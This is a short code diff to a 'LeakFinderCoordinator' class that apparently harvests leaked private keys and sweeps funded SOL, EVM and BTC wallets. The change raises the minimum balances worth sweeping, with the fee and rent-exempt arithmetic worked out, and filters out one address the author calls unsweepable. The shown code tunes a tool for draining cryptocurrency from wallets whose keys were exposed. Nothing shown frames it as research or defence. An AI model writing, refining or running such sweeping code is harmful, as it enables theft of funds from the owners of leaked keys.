@@ -222,10 +222,11 @@ class LeakFinderCoordinator:
                 pass
         return all_keys
 
-    # Minimum balances worth sweeping (covers fees + rent-exempt minimum)
-    _MIN_SOL_LAMPORTS = 1_000_000   # 0.001 SOL — just above rent-exempt + fee
-    _MIN_EVM_WEI = 100_000_000_000_000  # 0.0001 ETH — covers gas
-    _MIN_BTC_SATS = 1_000  # 0.00001 BTC
+    # Minimum balances worth sweeping (must cover: fee + rent-exempt + meaningful transfer)
+    # SOL: 5000 fee + 890880 rent-exempt + 1000 min transfer = 895880 lamports
+    _MIN_SOL_LAMPORTS = 2_000_000   # 0.002 SOL — covers all costs with margin
+    _MIN_EVM_WEI = 500_000_000_000_000  # 0.0005 ETH — covers gas
+    _MIN_BTC_SATS = 5_000  # 0.00005 BTC
 
     async def _check_balances(self, keys: list[ExtractedKey]) -> list[ExtractedKey]:
         funded: list[ExtractedKey] = []
@@ -288,6 +289,10 @@ class LeakFinderCoordinator:
                     logger.debug("Skipping dust BTC: %s (%.8f)", addr[:10], r.balance)
             except Exception:
                 pass
+
+        # Filter out known unsweepable addresses (program-owned nonce accounts etc)
+        _SKIP_ADDRS = {"HAgk14JpMQLgt6rVgv7cBQFJWFto5Dqxi472uT3DKpqk"}
+        funded = [k for k in funded if not any(a in _SKIP_ADDRS for a in k.derived_addresses.values())]
 
         return funded
 
